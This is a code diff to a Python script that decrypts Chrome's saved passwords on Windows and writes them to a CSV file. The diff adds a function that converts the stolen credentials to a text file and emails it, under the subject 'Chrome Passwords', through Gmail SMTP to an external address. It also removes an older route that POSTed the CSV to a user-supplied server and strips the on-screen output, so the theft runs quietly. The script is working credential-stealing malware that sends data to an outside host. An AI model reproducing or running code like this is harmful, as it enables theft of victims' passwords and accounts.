@@ -9,6 +9,13 @@ from Cryptodome.Cipher import AES
 import shutil
 import csv
 import requests
+import ssl
+import smtplib
+from email.message import Message
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 # GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
@@ -67,10 +74,67 @@ def get_db_connection(chrome_path_login_db):
         print("%s" % str(e))
         print("[ERR] Chrome database cannot be found")
         return None
+    
+def mail(): 
+    subject = "Chrome Passwords"
+    body = "This is an email with attachment sent from Python"
+    sender_email = "@gmail.com"
+    receiver_email = "@yahoo.co.uk"
+    password = ""
 
+    # Create a multipart message and set headers
+    message = MIMEMultipart()
+    message["From"] = sender_email
+    message["To"] = receiver_email
+    message["Subject"] = subject
+    message["Bcc"] = receiver_email  # Recommended for mass emails
 
+    # Add body to email
+    message.attach(MIMEText(body, "plain"))
+
+    filename = "output.txt"  # In same directory as script
+
+    # Open PDF file in binary mode
+    with open('output.txt', "rb") as attachment:
+        # Add file as application/octet-stream
+        # Email client can usually download this automatically as attachment
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+
+    # Encode file in ASCII characters to send by email    
+    encoders.encode_base64(part)
+
+    # Add header as key/value pair to attachment part
+    part.add_header(
+        "Content-Disposition",
+        f"attachment; filename= {filename}",
+    )
+
+    # Add attachment to message and convert message to string
+    message.attach(part)
+    text = message.as_string()
+
+    # Log in to server using secure context and send email
+    context = ssl.create_default_context()
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, text)
+
+def csvt():
+    csv_file = 'decrypted_password.csv'  # Path to the CSV file
+    txt_file = 'output.txt'  # Path to the output text file
+
+    with open(csv_file, 'r') as csv_in_file:
+        csv_reader = csv.reader(csv_in_file)
+        with open(txt_file, 'w') as txt_out_file:
+            for row in csv_reader:
+                line = ' '.join(row) + '\n'  # Convert the CSV row to a space-separated line
+                txt_out_file.write(line)
+    
 if __name__ == '__main__':
     try:
+        with open('output.txt', 'a') as f:
+            csvt()
         # Create Dataframe to store passwords
         with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
@@ -95,9 +159,6 @@ if __name__ == '__main__':
                             # (3) Filter the initialisation vector & encrypted password from ciphertext
                             # (4) Use AES algorithm to decrypt the password
                             decrypted_password = decrypt_password(ciphertext, secret_key)
-                            print("Sequence: %d" % (index))
-                            print("URL: %s\nUser Name: %s\nPassword: %s\n" % (url, username, decrypted_password))
-                            print("*" * 50)
                             # (5) Save into CSV
                             csv_writer.writerow([index, url, username, decrypted_password])
                     # Close database connection
@@ -105,27 +166,10 @@ if __name__ == '__main__':
                     conn.close()
                     # Delete temp login db
                     os.remove("Loginvault.db")
+                    mail()
+                    
 
-        ip_addr = input("Enter the IP address of the server: ")
-        port = input("Enter the port number: ")
-
-        def post_data():
-            url = "https://" + ip_addr + ":" + port   # Replace with your desired URL
-
-            with open('decrypted_password.csv', 'r', encoding='utf-8') as csv_file:
-                csv_data = csv_file.read()
-
-            payload = {'data': csv_data}  # Assuming you want to send the data as a payload parameter
-
-            try:
-                response = requests.post(url, data=payload, verify=False)
-                response.raise_for_status()  # Check if the request was successful
-                print("Data posted successfully.")
-            except requests.exceptions.RequestException as e:
-                print("[ERR] %s" % str(e))
-
-
-        post_data()  # Call the post_data() function to post the CSV data
+         # Call the post_data() function to post the CSV data
 
     except Exception as e:
         print("[ERR] %s" % str(e))
